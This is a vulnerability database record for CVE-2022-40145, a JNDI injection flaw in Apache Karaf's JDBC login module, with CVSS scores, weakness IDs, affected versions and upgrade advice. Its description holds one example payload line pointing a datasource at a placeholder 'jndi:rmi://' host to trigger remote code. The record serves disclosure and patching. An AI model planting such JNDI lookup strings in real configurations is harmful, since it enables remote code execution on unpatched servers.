{
	"id": "CVE-2022-40145",
	"sourceIdentifier": "security@apache.org",
	"vulnStatus": "Modified",
	"published": "2022-12-21T16:15:08.930",
	"lastModified": "2025-04-15T18:15:44.667",
	"descriptions": [
		{
			"lang": "en",
			"value": "This vulnerable is about a potential code injection when an attacker has control of the target LDAP server using in the JDBC JNDI URL.\n\nThe function jaas.modules.src.main.java.porg.apache.karaf.jass.modules.jdbc.JDBCUtils#doCreateDatasource\nuse InitialContext.lookup(jndiName) without filtering.\nAn user can modify `options.put(JDBCUtils.DATASOURCE, \"osgi:\" + DataSource.class.getName());` to `options.put(JDBCUtils.DATASOURCE,\"jndi:rmi://x.x.x.x:xxxx/Command\");` in JdbcLoginModuleTest#setup.\n\nThis is vulnerable to a remote code execution (RCE) attack when a\nconfiguration uses a JNDI LDAP data source URI when an attacker has\ncontrol of the target LDAP server.This issue affects all versions of Apache Karaf up to 4.4.1 and 4.3.7.\n\nWe encourage the users to upgrade to Apache Karaf at least 4.4.2 or 4.3.8"
		},
		{
			"lang": "es",
			"value": "Esta vulnerabilidad se trata de una posible inyección de código cuando un atacante tiene el control del servidor LDAP de destino utilizando la URL JDBC JNDI. La función jaas.modules.src.main.java.porg.apache.karaf.jass.modules.jdbc.JDBCUtils#doCreateDatasource utiliza InitialContext.lookup(jndiName) sin filtrar. Un usuario puede modificar `options.put(JDBCUtils.DATASOURCE, \"osgi:\" + DataSource.class.getName());` a `options.put(JDBCUtils.DATASOURCE,\"jndi:rmi://xxxx:xxxx/Command \");` en JdbcLoginModuleTest#setup. Esto es vulnerable a un ataque de ejecución remota de código (RCE) cuando una configuración utiliza un URI de origen de datos LDAP JNDI cuando un atacante tiene control del servidor LDAP de destino. Este problema afecta a todas las versiones de Apache Karaf hasta 4.4.1 y 4.3.7. Animamos a los usuarios a actualizar a Apache Karaf al menos 4.4.2 o 4.3.8."
		}
	],
	"references": [
		{
			"source": "security@apache.org",
			"tags": [
				"Vendor Advisory"
			],
			"url": "https://karaf.apache.org/security/cve-2022-40145.txt"
		},
		{
			"source": "af854a3a-2127-422b-91ae-364da2661108",
			"tags": [
				"Vendor Advisory"
			],
			"url": "https://karaf.apache.org/security/cve-2022-40145.txt"
		}
	],
	"metrics": {
		"cvssMetricV31": [
			{
				"source": "nvd@nist.gov",
				"type": "Primary",
				"cvssData": {
					"version": "3.1",
					"vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
					"attackVector": "NETWORK",
					"attackComplexity": "LOW",
					"privilegesRequired": "NONE",
					"userInteraction": "NONE",
					"scope": "UNCHANGED",
					"confidentialityImpact": "HIGH",
					"integrityImpact": "HIGH",
					"availabilityImpact": "HIGH",
					"baseScore": 9.8,
					"baseSeverity": "CRITICAL"
				},
				"exploitabilityScore": 3.9,
				"impactScore": 5.9
			},
			{
				"source": "134c704f-9b21-4f2e-91b3-4a467353bcc0",
				"type": "Secondary",
				"cvssData": {
					"version": "3.1",
					"vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
					"attackVector": "NETWORK",
					"attackComplexity": "LOW",
					"privilegesRequired": "NONE",
					"userInteraction": "NONE",
					"scope": "UNCHANGED",
					"confidentialityImpact": "HIGH",
					"integrityImpact": "HIGH",
					"availabilityImpact": "HIGH",
					"baseScore": 9.8,
					"baseSeverity": "CRITICAL"
				},
				"exploitabilityScore": 3.9,
				"impactScore": 5.9
			}
		]
	},
	"weaknesses": [
		{
			"source": "security@apache.org",
			"type": "Secondary",
			"description": [
				{
					"lang": "en",
					"value": "CWE-20"
				},
				{
					"lang": "en",
					"value": "CWE-74"
				}
			]
		},
		{
			"source": "nvd@nist.gov",
			"type": "Primary",
			"description": [
				{
					"lang": "en",
					"value": "NVD-CWE-Other"
				}
			]
		}
	],
	"configurations": [
		{
			"nodes": [
				{
					"operator": "OR",
					"cpeMatch": [
						{
							"vulnerable": true,
							"criteria": "cpe:2.3:a:apache:karaf:*:*:*:*:*:*:*:*",
							"matchCriteriaId": "CEDC6799-2894-4DB9-A66B-9481580EDC66",
							"versionEndExcluding": "4.3.8"
						},
						{
							"vulnerable": true,
							"criteria": "cpe:2.3:a:apache:karaf:*:*:*:*:*:*:*:*",
							"matchCriteriaId": "3320F4C0-A9F6-43C3-B473-1E56EFD0086D",
							"versionStartIncluding": "4.4.0",
							"versionEndExcluding": "4.4.2"
						}
					]
				}
			]
		}
	],
	"vcConfigurations": [
		{
			"nodes": [
				{
					"operator": "OR",
					"cpeMatch": [
						{
							"vulnerable": true,
							"criteria": "cpe:2.3:a:apache:karaf:*:*:*:*:*:*:*:*",
							"matchCriteriaId": "",
							"versionEndExcluding": "4.3.8"
						},
						{
							"vulnerable": true,
							"criteria": "cpe:2.3:a:apache:karaf:*:*:*:*:*:*:*:*",
							"matchCriteriaId": "",
							"versionStartIncluding": "4.4.0",
							"versionEndExcluding": "4.4.2"
						}
					]
				}
			]
		}
	],
	"vcVulnerableCPEs": [
		"cpe:2.3:a:apache:karaf:2.0.0:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.1.0:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.1.1:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.1.2:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.1.3:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.1.4:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.1.5:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.1.6:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.2.0:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.2.10:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.2.11:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.2.1:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.2.2:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.2.3:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.2.4:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.2.5:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.2.6:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.2.7:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.2.8:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.2.9:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.3.0:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.3.10:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.3.11:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.3.12:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.3.1:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.3.2:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.3.3:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.3.4:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.3.5:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.3.6:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.3.7:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.3.8:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.3.9:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.4.0:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.4.1:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.4.2:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.4.3:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.4.4:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:2.7.0:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:3.0.0:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:3.0.0:rc1:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:3.0.1:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:3.0.2:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:3.0.3:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:3.0.4:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:3.0.5:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:3.0.6:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:3.0.7:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:3.0.8:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:3.0.9:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.0.0:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.0.0:milestone1:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.0.0:milestone2:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.0.0:milestone3:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.0.10:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.0.1:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.0.2:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.0.3:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.0.4:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.0.5:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.0.6:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.0.7:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.0.8:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.0.9:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.1.0:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.1.1:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.1.2:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.1.3:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.1.4:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.1.5:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.1.6:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.1.7:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.0:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.0:milestone1:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.0:milestone2:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.10:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.11:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.12:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.13:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.14:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.15:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.1:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.2:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.3:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.4:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.5:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.8:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.2.9:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.3.0:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.3.1:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.3.2:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.3.3:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.3.4:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.3.5:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.3.6:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.3.7:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.4.0:*:*:*:*:*:*:*",
		"cpe:2.3:a:apache:karaf:4.4.1:*:*:*:*:*:*:*"
	]
}
